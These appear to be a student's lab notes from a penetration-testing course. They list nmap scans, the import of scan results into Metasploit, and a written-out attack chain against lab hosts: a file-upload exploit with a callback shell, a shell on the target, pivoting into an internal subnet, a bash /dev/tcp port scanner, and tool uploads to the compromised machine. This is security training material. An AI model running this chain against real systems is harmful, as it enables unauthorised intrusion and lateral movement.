# Assessment Methodologies: Enumeration

## Nmap Scripting Engine (NSE)

### **Windows Recon: Nmap Host Discovery**

```bash
ping -c 5 demo.ine.local
nmap demo.ine.local
nmap -Pn demo.ine.local
nmap -Pn -p 443 demo.ine.local
nmap -Pn -sV -p 80 demo.ine.local
```

### **Importing Nmap Scan Results Into MSF**

```bash
ping -c 4 demo.ine.local
nmap -sV -Pn -oX myscan.xml demo.ine.local
service postgresql start
msfconsole
db_status
db_import myscan.xml
hosts
services
```

### T1046 : Network Service Scanning

```bash
ping -c 4 demo1.ine.local
nmap demo1.ine.local
curl demo1.ine.local
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
shell
ip addr
run autoroute -s 192.180.108.2
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
CTRL+z
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
fg
sessions -i 1
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
./nmap -p- 192.180.108.3
```
